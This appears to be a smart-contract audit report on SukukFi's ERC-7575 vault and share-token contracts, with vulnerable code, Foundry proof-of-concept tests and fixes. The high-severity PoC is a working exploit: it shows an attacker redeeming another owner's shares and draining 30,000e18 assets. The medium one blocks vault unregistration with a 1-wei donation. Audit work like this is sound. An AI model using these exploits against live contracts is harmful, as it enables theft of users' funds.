# SukukFi

## Findings Summary

| ID | Title | Duplicates |
| - | - | - |
| [H-01](#werc7575vault-cant-be-drained-due-to-missing-input-validation) | WERC7575Vault can be drained due to missing input validation | 163 |
| [M-01](#unregistervault-can-be-dosed-via-frontrunning-with-1-wei-donation) | unregisterVault() can be DoSed via front-running with 1 wei donation | 102 |
| [QA](#qa-report) | QA Report | N/A |

## WERC7575Vault can be drained due to missing input validation

## Vulnerability Detail

```solidity
function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
    assets = previewRedeem(shares);
    _withdraw(assets, shares, receiver, owner);
}

function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
    if (receiver == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (owner == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    }
    if (assets == 0) revert ZeroAssets();
    if (shares == 0) revert ZeroShares();

>   _shareToken.spendSelfAllowance(owner, shares); 
    _shareToken.burn(owner, shares);
    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

In `WERC7575Vault::redeem()`, all inputs are checked against zero-values, then the owner’s self allowance is spent before shares are burned / assets are dispensed to the `receiver`. 

The only validation that occurs is the self allowance check for the owner, which allows anyone to redeem shares on-behalf of any owner after they have self-approved themselves. 

## PoC

```solidity
// CompleteFlowWalkthrough.t.sol
// ❯ forge test --match-test test_CompleteFlow_StepByStepPoC -vv
function test_CompleteFlow_StepByStepPoC() public {
    address attacker = address(0x8972935729835);
    uint256 userDepositAmount = 50000e18;
    uint256 investmentAmount = 30000e18;
    uint256 yieldAmount = 5000e18;
    uint256 expectedWithdrawal = investmentAmount + yieldAmount;

    // Step 1: User Deposit Phase
    uint256 actualShares = _testUserDepositPhase(userDepositAmount);

    uint256 postDepositVaultBalance = asset.balanceOf(address(vault));
    (, uint256 totalNormalizedAssets) = shareToken.getCirculatingSupplyAndAssets();
    assertEq(postDepositVaultBalance, 50000000000000000000000);
    assertEq(totalNormalizedAssets, 50000000000000000000000);

    // Step 2: Investment Phase
    _testInvestmentPhase(userDepositAmount, investmentAmount);

    uint256 postInvestmentVaultBalance = asset.balanceOf(address(vault));
    (, totalNormalizedAssets) = shareToken.getCirculatingSupplyAndAssets();
    assertEq(postInvestmentVaultBalance, 20000000000000000000000);
    assertEq(totalNormalizedAssets, 50000000000000000000000);

    uint256 investedAssets = shareToken.getInvestedAssets();
    assertEq(investedAssets, 30000000000000000000000);

    // WERC7575ShareToken balance of shareToken (receiver supplied in investAssets())
    // Underlying asset balance of attacker
    uint256 beforeShareTokenBalance = IERC20(investmentVault.share()).balanceOf(address(shareToken));
    uint256 beforeAttackerBalance = IERC20(asset).balanceOf(attacker);
    console.log("\n");
    console.log("beforeShareTokenBalance: ", beforeShareTokenBalance);
    console.log("beforeAttackerBalance: ", beforeAttackerBalance);

    // @audit Due to missing validation against msg.sender,
    //     ANYONE can redeem on-behalf of an owner who has self-approved themselves
    //     In this PoC, the attacker redeems on-behalf of shareToken, which silos the shares minted from investAssets()
    vm.prank(attacker);
    investmentVault.redeem(beforeShareTokenBalance, attacker, address(shareToken));

    // @audit-info attacker leaves nothing 
    uint256 afterShareTokenBalance = IERC20(investmentVault.share()).balanceOf(address(shareToken));
    uint256 afterAttackerBalance = IERC20(asset).balanceOf(attacker);
    console.log("afterShareTokenBalance: ",  afterShareTokenBalance);
    console.log("afterAttackerBalance: ", afterAttackerBalance);
}
```

```solidity
Ran 1 test for test/CompleteFlowWalkthrough.t.sol:CompleteFlowWalkthrough
[PASS] test_CompleteFlow_StepByStepPoC() (gas: 537228)
Logs:
  
--- STEP 1: USER DEPOSIT PHASE ---
  - Initial state verified
  - Deposit request completed
  - Deposit request fulfilled
  - User deposit phase completed
  
--- STEP 2: INVESTMENT PHASE ---
  - Investment completed, invested: 30000000000000000000000
  

  beforeShareTokenBalance:  30000000000000000000000
  beforeAttackerBalance:  0
  afterShareTokenBalance:  0
  afterAttackerBalance:  30000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.23ms (4.68ms CPU time)

Ran 1 test suite in 174.54ms (11.23ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Total theft of assets 

## Recommendation

Consider spending the owner’s self-allowance as well as another allowance against the `msg.sender` if the caller is not the owner

```solidity
function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
    if (receiver == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (owner == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    }
    if (assets == 0) revert ZeroAssets();
    if (shares == 0) revert ZeroShares();

    _shareToken.spendSelfAllowance(owner, shares); 
+   _shareToken.spendAllowance(owner, msg.sender, shares);  
    _shareToken.burn(owner, shares);
    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

## unregisterVault() can be DoSed via front-running with 1 wei donation

## Vulnerability Detail

```solidity
function unregisterVault(address asset) external onlyOwner {
    // SNIP
    
    // 2. Final safety: Check raw asset balance in vault contract
    // This catches any remaining assets including investments and edge cases
    // If this happens, there is either a bug in the vault
    // or assets were sent to the vault without directly
>   if (IERC20(asset).balanceOf(vaultAddress) != 0) {
>       revert CannotUnregisterVaultAssetBalance();
>   }

    // Remove vault registration (automatically removes from enumerable collection)
    $.assetToVault.remove(asset);
    delete $.vaultToAsset[vaultAddress];

    emit VaultUpdate(asset, address(0));
}
```

`unregisterVault()` is present in both `ShareTokenUpgradeable` and `WERC7575ShareToken`, which integrate with `ERC7575VaultUpgradeable` and `WERC7575Vault`, respectively.

The `unregisterVault()` flow includes a strict balance check on the `vaultAddress`.

A malicious user can DoS `unregisterVault()` by donating as little as 1 wei to the `vaultAddress`.

Neither of the vault implementations have any methods to sweep dust - the DoS will persist until a contract upgrade can be done on `ShareTokenUpgradeable`. 

However, for `WERC7575ShareToken`, the DoS will be permanent.

### PoC

```solidity
// ERC7575MultiAsset.t.sol
// ❯ forge test --match-test test_MultiAsset_VaultUpdateDoS -vvvv
function test_MultiAsset_VaultUpdateDoS() public {
    // Deploy a real new vault for the same asset
    ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
    bytes memory vaultInitData = abi.encodeWithSelector(ERC7575VaultUpgradeable.initialize.selector, usdcAsset, address(shareToken), owner);
    ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
    address newVault = address(vaultProxy);

    // First deactivate the existing vault, then unregister
    vm.prank(owner);
    usdcVault.setVaultActive(false);

    // @audit attacker front-runs unregisterVault() call
    address attacker = address(0x1123293);
    deal(address(usdcAsset), attacker, 1); // 1 wei
    vm.prank(attacker);
    usdcAsset.transfer(address(usdcVault), 1);

    vm.expectRevert("CannotUnregisterVaultAssetBalance()");
    vm.prank(owner);
    shareToken.unregisterVault(address(usdcAsset));
}
```

## Impact

`ShareTokenUpgradeable::unregisterVault()` will be DoSed until the contract is upgraded; `WERC7575ShareToken::unregisterVault()` will be permanently DoSed. 

## Recommendation

Consider internally tracking total deposited assets in both `ERC7575VaultUpgradeable` and `WERC7575Vault` and allow `unregisterVault()` to execute if total deposited assets = 0 instead.

## QA Report

## 1. Vault approval is not revoked in `ShareTokenUpgradeable::unregisterVault()` flow

## Vulnerability Detail

```solidity
function registerVault(address asset, address vaultAddress) external onlyOwner {
    // SNIP

    // If investment ShareToken is already configured, set up investment for the new vault
    // Only configure if the vault address is a deployed contract
>   address investmentShareToken = $.investmentShareToken;
>   if (investmentShareToken != address(0)) {
>       _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
>   }

    // If investment manager is already configured, set it for the new vault
    // Only configure if the vault address is a deployed contract
    address investmentManager = $.investmentManager;
    if (investmentManager != address(0)) {
        ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
    }

    emit VaultUpdate(asset, vaultAddress);
}

function _configureVaultInvestmentSettings(address asset, address vaultAddress, address investmentShareToken) internal {
    // Find the corresponding investment vault for this asset
    address investmentVaultAddress = IERC7575ShareExtended(investmentShareToken).vault(asset);

    // Configure investment vault if there's a matching one for this asset
    if (investmentVaultAddress != address(0)) {
        ERC7575VaultUpgradeable(vaultAddress).setInvestmentVault(IERC7575(investmentVaultAddress));

        // Grant unlimited allowance to the vault on the investment ShareToken
>       IERC20(investmentShareToken).approve(vaultAddress, type(uint256).max);
    }
}
```

`_configureVaultInvestmentSettings()` will be called in the `registerVault()` flow, if `investmentShareToken` has been configured.

In `_configureVaultInvestmentSettings()`, the `vaultAddress` is configured with max allowance for `investmentShareToken`.

The allowance is not reset in the `unregisterVault()` flow, which will leave a lingering max approval to the old vault. 

## Impact

Lingering `investmentShareToken` allowance on previous vault even after vault update

## Recommendation

```solidity
// ShareTokenUpgradeable.sol
function unregisterVault(address asset) external onlyOwner {
    // SNIP

    // Remove vault registration (automatically removes from enumerable collection)
    $.assetToVault.remove(asset);
    delete $.vaultToAsset[vaultAddress];
    
+   IERC20(investmentShareToken).approve(vaultAddress, 0);

    emit VaultUpdate(asset, address(0));
}
```

### PoC

```solidity
// CompleteFlowWalkthrough.t.sol
// ❯ forge test --match-test test_VaultUpdate_LingeringApprovalPoC -vv
function test_VaultUpdate_LingeringApprovalPoC() public {
    // @audit unregisterVault()
    // Deploy a real new vault for the same asset
    ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
    bytes memory vaultInitData = abi.encodeWithSelector(ERC7575VaultUpgradeable.initialize.selector, asset, address(shareToken), owner);
    ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
    address newVault = address(vaultProxy);

    vm.startPrank(owner);
    vault.setVaultActive(false);

    shareToken.unregisterVault(address(asset));

    shareToken.registerVault(address(asset), newVault);
    assertEq(shareToken.vault(address(asset)), newVault);
    vm.stopPrank();

    uint256 oldVaultAllowance = investmentShareToken.allowance(address(shareToken), address(vault));
    uint256 newVaultAllowance = investmentShareToken.allowance(address(shareToken), address(newVault));
    assertTrue(oldVaultAllowance == type(uint256).max);
    assertTrue(newVaultAllowance == type(uint256).max);
}
```

---

## 2. `ShareTokenUpgradeable` and `WERC7575ShareToken` are non-compliant with expected ERC-7575 Standard due to incorrect `supportsInterface()` implementation

## Vulnerability Detail

```solidity
ERC-165 support
Vaults implementing ERC-7575 MUST implement the ERC-165 supportsInterface function. 
The Vault contract MUST return the constant value true if 0x2f0a18c5 is passed through the interfaceID argument.

The share contract SHOULD implement the ERC-165 supportsInterface function. 
The share token MUST return the constant value true if 0xf815c03d is passed through the interfaceID argument.
```

ref: https://eips.ethereum.org/EIPS/eip-7575

```solidity
// ShareTokenUpgradeable.sol
function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
    return interfaceId == type(IERC7575ShareExtended).interfaceId || interfaceId == type(IERC7540Operator).interfaceId || interfaceId == type(IERC165).interfaceId;
} 

// WERC7575ShareToken.sol
function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
    return interfaceId == type(IERC7575Share).interfaceId || super.supportsInterface(interfaceId);
}
```

`ShareTokenUpgradeable` (IERC7575ShareExtended) and `WERC7575ShareToken` (IERC7575Share) both implement `supportsInterface()` as recommended by ERC-7575.

It is also stated that `supportsInterface()` MUST return `true` for input: `0xf815c03d` - This case is not handled in `supportsInterface()` for both share token implementations, which makes these implementations non-compliant with ERC-7575 Specification.

## Impact

`ShareTokenUpgradeable` and `WERC7575ShareToken` are non-compliant with expected ERC-7575 Standard 

## Recommendation

```solidity
// ShareTokenUpgradeable.sol
function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
-   return interfaceId == type(IERC7575ShareExtended).interfaceId || interfaceId == type(IERC7540Operator).interfaceId || interfaceId == type(IERC165).interfaceId;
+   return interfaceId == type(IERC7575ShareExtended).interfaceId || interfaceId == type(IERC7540Operator).interfaceId || interfaceId == type(IERC165).interfaceId || interfaceId == 0xf815c03d;
} 

// WERC7575ShareToken.sol
function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
-   return interfaceId == type(IERC7575Share).interfaceId || super.supportsInterface(interfaceId);
+   return interfaceId == type(IERC7575Share).interfaceId || super.supportsInterface(interfaceId) || interfaceId == 0xf815c03d;
}
```

### PoC

```solidity
// ShareTokenUpgradeableCoverageTests.t.sol
// ❯ forge test --match-test testSupportsInterfaceERC165PoC -vvvv
function testSupportsInterfaceERC165PoC() public {
    assertTrue(shareToken.supportsInterface(0x01ffc9a7), "Should support ERC165");

    // @audit Based on ERC-7575 Specification - This case should return true
    assertFalse(shareToken.supportsInterface(0xf815c03d));
}
```

```solidity
// ShareTokenCompliance.t.sol
// ❯ forge test --match-test testInterfaceCompliancePoC -vvvv
function testInterfaceCompliancePoC() public {
    // Test ERC165 interface
    assertTrue(shareToken.supportsInterface(0x01ffc9a7)); // ERC165
        
    // @audit Based on ERC-7575 Specification - This case should return true
    assertFalse(shareToken.supportsInterface(0xf815c03d));
}
```

---

## 3. `WERC7575ShareToken::batchTransfers()` / `WERC7575ShareToken::rBatchTransfers()` is missing pause check

## Vulnerability Detail

```solidity
/*
 * Requirements:
 * - All arrays must have the same length
 * - Maximum 100 transfers per batch 
 * - Contract must not be paused 
 * - Sufficient balance in debtor accounts
 */
function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {}
 
/*
 * Requirements:
 * - All arrays must have the same length
 * - Maximum 100 transfers per batch
 * - Contract must not be paused
 * - Sufficient balance in debtor accounts
 * - rBalanceFlags must be pre-computed using computeRBalanceFlags()
 */
function rBatchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts, uint256 rBalanceFlags) external onlyValidator returns (bool) {}
```

The code comments for `batchTransfers()` and `rBatchTransfers()` list pause check as a requirement.

However, this is not enforced in either of these methods.

## Impact

Both `batchTransfers()` and `rBatchTransfers()` can be called while `WERC7575ShareToken` is paused. 

Marking as low, given `Validator` is a permissioned role.

## Recommendation

```solidity
function batchTransfers(
    address[] calldata debtors, 
    address[] calldata creditors, 
    uint256[] calldata amounts
- ) external onlyValidator returns (bool) {}
+ ) external onlyValidator whenNotPaused returns (bool) {}

function rBatchTransfers(
    address[] calldata debtors, 
    address[] calldata creditors, 
    uint256[] calldata amounts, 
    uint256 rBalanceFlags
- ) external onlyValidator returns (bool) {}
+ ) external onlyValidator whenNotPaused returns (bool) {}
```

---

## 4. `ERC7575VaultUpgradeable` should use `ReentrancyGuardUpgradeable` instead of `ReentrancyGuard`

## Vulnerability Detail

```solidity
contract ERC7575VaultUpgradeable is Initializable, ReentrancyGuard, Ownable2StepUpgradeable, IERC7540, IERC7887, IERC165, IVaultMetrics, IERC7575Errors, IERC20Errors {}
```

`ERC7575VaultUpgradeable` is intended to be upgradeable.

There is an upgradeable version of `ReentrancyGuard`, `ReentrancyGuardUpgradeable`, that is recommended instead for these use cases.

## Recommendation

```solidity
contract ERC7575VaultUpgradeable is Initializable, ReentrancyGuardUpgradeable, Ownable2StepUpgradeable, IERC7540, IERC7887, IERC165, IVaultMetrics, IERC7575Errors, IERC20Errors {}
```

---

## 5.  Pre-increment `accountsLength` in `WERC7575ShareToken::consolidateTransfers()`

## Vulnerability Detail

```solidity
function consolidateTransfers(
    address[] calldata debtors,
    address[] calldata creditors,
    uint256[] calldata amounts
)
    internal
    pure
    returns (DebitAndCredit[] memory accounts, uint256 accountsLength)
{
    // SNIP

    // Outer loop: process each transfer
    for (uint256 i = 0; i < debtorsLength;) {
        address debtor = debtors[i];
        address creditor = creditors[i];
        uint256 amount = amounts[i];

        // Skip self-transfers (debtor == creditor)
        if (debtor != creditor) {
            // SNIP

            // Create new account entries only if not found in existing accounts
            if ((addFlags & 1) != 0) {
                // Check bit 0 (addDebtor)
                accounts[accountsLength] = DebitAndCredit(debtor, amount, 0);
>               accountsLength++; // @audit pre-increment
            }
            if ((addFlags & 2) != 0) {
                // Check bit 1 (addCreditor)
                accounts[accountsLength] = DebitAndCredit(creditor, 0, amount);
>               accountsLength++;
            }
        }

        unchecked {
            ++i;
        }
    }
}
```

`accountsLength` can be pre-incremented for a small amount of gas savings and to keep the system consistent.

## Recommendation

```solidity
function consolidateTransfers(
    address[] calldata debtors,
    address[] calldata creditors,
    uint256[] calldata amounts
)
    internal
    pure
    returns (DebitAndCredit[] memory accounts, uint256 accountsLength)
{
    // SNIP

    // Outer loop: process each transfer
    for (uint256 i = 0; i < debtorsLength;) {
        address debtor = debtors[i];
        address creditor = creditors[i];
        uint256 amount = amounts[i];

        // Skip self-transfers (debtor == creditor)
        if (debtor != creditor) {
            // SNIP

            // Create new account entries only if not found in existing accounts
            if ((addFlags & 1) != 0) {
                // Check bit 0 (addDebtor)
                accounts[accountsLength] = DebitAndCredit(debtor, amount, 0);
-               accountsLength++; // @audit pre-increment
+               ++accountsLength;
            }
            if ((addFlags & 2) != 0) {
                // Check bit 1 (addCreditor)
                accounts[accountsLength] = DebitAndCredit(creditor, 0, amount);
-               accountsLength++;
+               ++accountsLength; 
            }
        }

        unchecked {
            ++i;
        }
    }
}
```

---

## 6. `ERC7575VaultUpgradeable::setOperator()` emits the same exact event twice

## Vulnerability Detail

```solidity
// ERC7575VaultUpgradeable.sol
function setOperator(address operator, bool approved) public virtual returns (bool) {
    VaultStorage storage $ = _getVaultStorage();
    // Call setOperatorFor on the ShareToken to preserve the original msg.sender
    ShareTokenUpgradeable($.shareToken).setOperatorFor(msg.sender, operator, approved);
    // Emit event from vault level for compatibility with tests
>   emit OperatorSet(msg.sender, operator, approved);
    return true;
}

// ShareTokenUpgradeable.sol
function setOperator(address operator, bool approved) external virtual returns (bool) {
    if (msg.sender == operator) revert CannotSetSelfAsOperator();
    ShareTokenStorage storage $ = _getShareTokenStorage();
    $.operators[msg.sender][operator] = approved;
>   emit OperatorSet(msg.sender, operator, approved);
    return true;
}
```

Consider only emitting this event at the `ERC7575VaultUpgradeable` level, which is the top level.

## Recommendation

```solidity
// ShareTokenUpgradeable.sol
function setOperator(address operator, bool approved) external virtual returns (bool) {
    if (msg.sender == operator) revert CannotSetSelfAsOperator();
    ShareTokenStorage storage $ = _getShareTokenStorage();
    $.operators[msg.sender][operator] = approved;
-   emit OperatorSet(msg.sender, operator, approved);
    return true;
}
```

---

## 7. Missing validation for KYC-approved addresses in `WERC7575ShareToken::batchTransfers()` / `WERC7575ShareToken::rBatchTransfers()`

## Vulnerability Detail

One of the invariants of the system is: `Only KYC-verified addresses can receive/hold shares`

`isKycVerified` mapping is not checked to ensure that creditors have not already been whitelisted by the system in `batchTransfers()` and `rBatchTransfers()`.

Marking as low, given `Validators` are trusted in the system.

## Recommendation

Consider adding this check in `consolidateTransfers()`, which is called at the beginning of affected methods.

```solidity
function consolidateTransfers(
    address[] calldata debtors,
    address[] calldata creditors,
    uint256[] calldata amounts
)
    internal
    pure
    returns (DebitAndCredit[] memory accounts, uint256 accountsLength)
{
    uint256 debtorsLength = debtors.length;
    if (debtorsLength > MAX_BATCH_SIZE) revert ArrayTooLarge(); 
    if (!(debtorsLength == creditors.length && debtorsLength == amounts.length)) revert ArrayLengthMismatch();

    accounts = new DebitAndCredit[](debtorsLength * BATCH_ARRAY_MULTIPLIER); // @audit-ok
    accountsLength = 0;

    // Outer loop: process each transfer
    for (uint256 i = 0; i < debtorsLength;) {
        address debtor = debtors[i];
        address creditor = creditors[i];
        uint256 amount = amounts[i];

        // Skip self-transfers (debtor == creditor)
-       if (debtor != creditor) {
+       if (debtor != creditor && isKycVerified[creditor]) {
            // Inline addAccount logic with bit flags for account creation
            uint8 addFlags = 0x3; // 0b11 = both addDebtor and addCreditor initially true

            // Inner loop: check if debtor and creditor already exist in accounts array
            for (uint256 j = 0; (j < accountsLength) && addFlags != 0; ++j) {
                if (accounts[j].owner == debtor) {
                    accounts[j].debit += amount;
                    addFlags &= ~uint8(1); // Clear bit 0 (addDebtor = false)
                } else if (accounts[j].owner == creditor) {
                    // else if is safe here since debtor != creditor (self-transfers already skipped)
                    accounts[j].credit += amount;
                    addFlags &= ~uint8(2); // Clear bit 1 (addCreditor = false)
                }
            }

            // Create new account entries only if not found in existing accounts
            if ((addFlags & 1) != 0) {
                // Check bit 0 (addDebtor)
                accounts[accountsLength] = DebitAndCredit(debtor, amount, 0);
                accountsLength++; // @audit pre-increment
            }
            if ((addFlags & 2) != 0) {
                // Check bit 1 (addCreditor)
                accounts[accountsLength] = DebitAndCredit(creditor, 0, amount);
                accountsLength++;
            }
        }

        unchecked {
            ++i;
        }
    }
}
```

---

## 8. `Deposit` event deviates from ERC-7540 Specification

## Vulnerability Detail

---

### **`deposit` and `mint` overloaded methods**

Implementations MUST support an additional overloaded `deposit` and `mint` method on the specification from [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626), with an additional `controller` input of type `address`:

- `deposit(uint256 assets, address receiver, address controller)`
- `mint(uint256 shares, address receiver, address controller)`

Calls MUST revert unless `msg.sender` is either equal to `controller` or an operator approved by `controller`.

The `controller` field is used to discriminate the Request for which the `assets` should be claimed in the case where `msg.sender` is NOT `controller`.

When the `Deposit` event is emitted, the first parameter MUST be the `controller`, and the second parameter MUST be the `receiver`.

---

ref: https://eips.ethereum.org/EIPS/eip-7540

```solidity
// ERC7575VaultUpgradeable.sol
function deposit(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
    // SNIP

>   emit Deposit(receiver, controller, assets, shares);

    // Transfer shares from vault to receiver using ShareToken
    if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
        revert ShareTransferFailed();
    } 
}
```

It is stated that the `Deposit` event should emit `controller` as the first parameter and `receiver` as the second - The implementation currently does the opposite.

## Recommendation

```solidity
function deposit(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
    // SNIP

-   emit Deposit(receiver, controller, assets, shares);
+   emit Deposit(controller, receiver, assets, shares);

    // Transfer shares from vault to receiver using ShareToken
    if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
        revert ShareTransferFailed();
    } 
}

function mint(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
    // SNIP

-   emit Deposit(receiver, controller, assets, shares);
+   emit Deposit(controller, receiver, assets, shares);

    // Transfer shares from vault to receiver using ShareToken
    if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
        revert ShareTransferFailed();
    }
}
```

---

## 9. Several events deviate from ERC-7887 Specification

## Vulnerability Detail

```solidity
// ERC7575VaultUpgradeable.sol
function cancelDepositRequest(uint256 requestId, address controller) external nonReentrant {
    // SNIP

    emit CancelDepositRequest(controller, controller, REQUEST_ID, msg.sender, pendingAssets);
    // @audit does not match ERC7887 specification
    // CancelDepositRequest(controller, requestId, sender)
}

function claimCancelDepositRequest(uint256 requestId, address receiver, address controller) external nonReentrant {
    // SNIP

    // Event emission
    emit CancelDepositRequestClaimed(controller, receiver, REQUEST_ID, assets);
    // @audit does not match ERC7887 specification
    // CancelDepositClaim(controller, receiver, requestId, sender, assets)
}

function cancelRedeemRequest(uint256 requestId, address controller) external nonReentrant {
    // SNIP

    emit CancelRedeemRequest(controller, controller, REQUEST_ID, msg.sender, pendingShares);
    // @audit does not match ERC7887 specification
    // CancelRedeemRequest(controller, requestId, sender)
}

function claimCancelRedeemRequest(uint256 requestId, address owner, address controller) external nonReentrant {
    // SNIP

    // Event emission
    emit CancelRedeemRequestClaimed(controller, owner, REQUEST_ID, shares);
    // @audit deviates from ERC7887 specification
    // CancelRedeemClaim(controller, receiver, requestId, sender, shares)
}
```

ref: https://eips.ethereum.org/EIPS/eip-7887

There are several functions related to cancellation logic, which do not emit events, as defined in the ERC-7887 Specification.

---

## 10. Input parameter, `receiver`, is not checked in several methods

```solidity
function withdraw(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
    VaultStorage storage $ = _getVaultStorage();
    if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
        revert InvalidCaller();
    }
    if (assets == 0) revert ZeroAssets();

    uint256 availableAssets = $.claimableRedeemAssets[controller];
    if (assets > availableAssets) revert InsufficientClaimableAssets();

    // Calculate proportional shares for the requested assets
    uint256 availableShares = $.claimableRedeemShares[controller];
    shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor); 

    if (shares == availableShares) {
        // Remove from active redeem requesters if no more claimable assets and the potential dust
        $.activeRedeemRequesters.remove(controller);
        delete $.claimableRedeemAssets[controller];
        delete $.claimableRedeemShares[controller];
    } else {
        $.claimableRedeemAssets[controller] -= assets;
        $.claimableRedeemShares[controller] -= shares;
    }

    $.totalClaimableRedeemAssets -= assets;
    $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

    // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
    if (shares > 0) {
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);
    }

>   emit Withdraw(msg.sender, receiver, controller, assets, shares);

>   SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
}
```

The `receiver` parameter is never checked against `address(0)` - It is recommended to remove these “user foot-guns.”

## Recommendation

Apply the changes below to ERC7575VaultUpgradeable - `deposit()`, `mint()`, `redeem()`, and `withdraw()`

```solidity
function withdraw(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
    VaultStorage storage $ = _getVaultStorage();
    if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
        revert InvalidCaller();
    }
    if (assets == 0) revert ZeroAssets();
+   if (receiver == address(0)) revert InvalidReceiver();
    
    // SNIP
}
```

---

## 11. `balanceOf()` check is redundant

## Vulnerability Detail

```solidity
function requestDeposit(uint256 assets, address controller, address owner) external nonReentrant returns (uint256 requestId) {
    VaultStorage storage $ = _getVaultStorage();
    if (!$.isActive) revert VaultNotActive();
    if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();
    if (assets == 0) revert ZeroAssets();
    if (assets < $.minimumDepositAmount * (10 ** $.assetDecimals)) {
        revert InsufficientDepositAmount();
    }
>   uint256 ownerBalance = IERC20Metadata($.asset).balanceOf(owner);
>   if (ownerBalance < assets) {
>       revert ERC20InsufficientBalance(owner, ownerBalance, assets);
>   }
    // ERC7887: Block new deposit requests while cancelation is pending for this controller
    if ($.controllersWithPendingDepositCancelations.contains(controller)) {
        revert DepositCancelationPending();
    }

    // Pull-Then-Credit pattern: Transfer assets first before updating state
    // This ensures we only credit assets that have been successfully received
    // Protects against transfer fee tokens and validates the actual amount transferred
>   SafeTokenTransfers.safeTransferFrom($.asset, owner, address(this), assets);

    // State changes after successful transfer
    $.pendingDepositAssets[controller] += assets;
    $.totalPendingDepositAssets += assets;
    $.activeDepositRequesters.add(controller);

    // Event emission
    emit DepositRequest(controller, owner, REQUEST_ID, msg.sender, assets);
    return REQUEST_ID;
}
```

In `ERC7575VaultUpgradeable::requestDeposit()`, there is a balance check that occurs prior to the underlying token being pulled from `msg.sender`.

This check is redundant and can be safely removed because a balance check already occurs in the `transferFrom()` call. 

## Recommendation

Apply the changes below to `requestDeposit()` and `requestRedeem()`

```solidity
function requestDeposit(uint256 assets, address controller, address owner) external nonReentrant returns (uint256 requestId) {
    VaultStorage storage $ = _getVaultStorage();
    if (!$.isActive) revert VaultNotActive();
    if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();
    if (assets == 0) revert ZeroAssets();
    if (assets < $.minimumDepositAmount * (10 ** $.assetDecimals)) {
        revert InsufficientDepositAmount();
    }
-   uint256 ownerBalance = IERC20Metadata($.asset).balanceOf(owner);
-   if (ownerBalance < assets) {
-       revert ERC20InsufficientBalance(owner, ownerBalance, assets);
-   }
    // ERC7887: Block new deposit requests while cancelation is pending for this controller
    if ($.controllersWithPendingDepositCancelations.contains(controller)) {
        revert DepositCancelationPending();
    }

    // SNIP
}
```

---

## 12. `scalingFactor` check can be removed

```solidity
function initialize(IERC20Metadata asset_, address shareToken_, address owner) public initializer {
    if (shareToken_ == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (address(asset_) == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    } 

    // Validate asset compatibility and get decimals
    uint8 assetDecimals;
    try IERC20Metadata(address(asset_)).decimals() returns (uint8 decimals) {
        if (decimals < DecimalConstants.MIN_ASSET_DECIMALS || decimals > DecimalConstants.SHARE_TOKEN_DECIMALS) {
            revert UnsupportedAssetDecimals();
        }
        assetDecimals = decimals;
    } catch {
        revert AssetDecimalsFailed();
    } 

    // Validate share token compatibility and enforce 18 decimals
    try IERC20Metadata(shareToken_).decimals() returns (uint8 decimals) {
        if (decimals != DecimalConstants.SHARE_TOKEN_DECIMALS) {
            revert WrongDecimals();
        }
    } catch {
        revert AssetDecimalsFailed();
    }

    __Ownable_init(owner);

    VaultStorage storage $ = _getVaultStorage();
    $.asset = address(asset_);
    $.assetDecimals = assetDecimals;
    $.shareToken = shareToken_;
    $.investmentManager = owner; // Initially owner is investment manager
    $.isActive = true; // Vault is active by default

    // Calculate scaling factor for decimal normalization: 10^(18 - assetDecimals)
    uint256 scalingFactor = 10 ** (DecimalConstants.SHARE_TOKEN_DECIMALS - assetDecimals);
>   if (scalingFactor > type(uint64).max) revert ScalingFactorTooLarge(); 
    $.scalingFactor = uint64(scalingFactor);
    $.minimumDepositAmount = 1000;
}
```

Due to the checks for `shareToken_` decimals and `asset_` decimals, `scalingFactor` is always guaranteed to be in the range of: `1 → 1e12`

Since we can be sure that `scalingFactor` is contained within this range, the upper bounds check for `scalingFactor` can be safely removed. 

